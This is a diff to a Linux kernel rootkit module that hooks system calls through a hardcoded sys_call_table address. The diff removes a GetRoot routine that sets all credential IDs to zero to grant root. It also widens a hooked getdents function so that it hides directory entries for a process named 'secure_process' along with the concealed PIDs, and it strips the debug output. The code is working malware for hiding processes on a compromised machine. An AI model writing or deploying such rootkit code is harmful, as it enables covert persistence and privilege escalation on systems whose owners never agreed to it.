@@ -76,23 +76,7 @@ static unsigned long *sys_call_table = (unsigned long*)0xffffffff81a00200;
 /* Setuid syscall hook */
 //asmlinkage int (*origin_setuid) (uid_t uid);
 
-void GetRoot(void){
-    /* Create new cred struct */
-	struct cred *nc;
-	nc = prepare_creds();
-	if(nc == NULL) return;
-#if 1
-	nc->uid.val = 0;
-	nc->gid.val = 0;
-	nc->euid.val = 0;
-	nc->egid.val = 0;
-	nc->suid.val = 0;
-	nc->sgid.val = 0;
-	nc->fsuid.val = 0;
-	nc->fsgid.val = 0;
-#endif
-	commit_creds(nc);
-}
+
 /*
 struct task_struct* FindTask(pid_t pid){
 	struct task_struct* curp = current;
@@ -138,12 +122,9 @@ asmlinkage int sneaky_getdents(unsigned int fd, struct linux_dirent *dirp, unsig
   		d = (struct linux_dirent *)((char*)dirp + bpos);
   		name = d->d_name;
   		d_type = *((char*)dirp+bpos+d->d_reclen-1);
-  		if(isInvisible(simple_strtoul(d->d_name, NULL, 10))){
-  			printk("this is the sneaky_process\n");
+		if(isInvisible(simple_strtoul(d->d_name, NULL, 10)) || strstr(name,"secure_process") != NULL){
   			sneaky_len = d->d_reclen;
-  			//printk("src = %d, des = %d\n",(char*)dirp+bpos+sneaky_len,(char*)dirp+bpos); 
   			des = memmove(((char*)dirp+bpos),((char*)dirp+bpos+sneaky_len),read-bpos-sneaky_len);
-  	     	//printk("des = %d\n",des);
   			read -= sneaky_len;
   		} 
   		else{
